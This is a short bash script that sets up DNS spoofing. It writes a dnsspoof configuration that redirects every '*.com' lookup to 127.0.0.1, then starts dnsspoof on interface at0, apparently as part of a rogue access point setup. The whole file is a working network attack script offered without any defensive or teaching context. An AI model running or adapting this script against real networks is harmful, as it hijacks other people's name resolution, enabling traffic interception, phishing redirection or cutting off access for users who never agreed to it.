#! /bin/bash

# setup dns spoofing

# these are the addresses to spoof
# be sure to use a tab between the IP and domain name
# <redirect ip>		<url>
echo "
127.0.0.1	*.com
" > config/dnsspoof.conf

# start the spoofing using dnsspoof.conf addresses
dnsspoof -i at0 -f config/dnsspoof.conf
